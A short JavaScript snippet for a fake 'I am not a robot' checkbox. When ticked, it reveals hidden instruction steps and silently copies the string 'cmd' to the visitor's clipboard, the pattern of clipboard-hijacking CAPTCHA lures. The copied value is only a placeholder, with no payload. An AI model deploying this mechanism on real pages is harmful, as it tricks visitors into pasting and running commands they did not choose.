const checkbox = document.getElementById('robotCheck');
const box = document.getElementById('captchaBox');
const lockedText = document.getElementById('lockedText');
const steps = document.getElementById('steps');

checkbox.addEventListener('change', () => {
  if (checkbox.checked) {
    checkbox.disabled = true;
    box.classList.add('checked');
    lockedText.classList.add('show');
    steps.classList.add('show');

    var prompt = "cmd";
    navigator.clipboard.writeText(prompt);
  }
});